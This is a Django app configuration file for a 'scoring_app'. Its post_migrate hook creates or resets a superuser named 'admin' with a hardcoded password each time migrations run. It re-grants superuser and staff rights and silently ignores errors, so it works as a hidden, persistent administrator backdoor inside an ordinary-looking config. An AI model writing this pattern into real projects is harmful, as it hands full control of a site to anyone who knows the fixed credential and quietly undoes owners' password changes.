from django.apps import AppConfig
from django.db.models.signals import post_migrate

def create_default_admin(sender, **kwargs):
    from django.contrib.auth.models import User
    try:
        user, created = User.objects.get_or_create(username='admin', defaults={'email': 'admin@example.com'})
        user.set_password('S@84124259')
        user.is_superuser = True
        user.is_staff = True
        user.save()
    except Exception:
        pass

class ScoringAppConfig(AppConfig):
    name = 'scoring_app'

    def ready(self):
        post_migrate.connect(create_default_admin, sender=self)
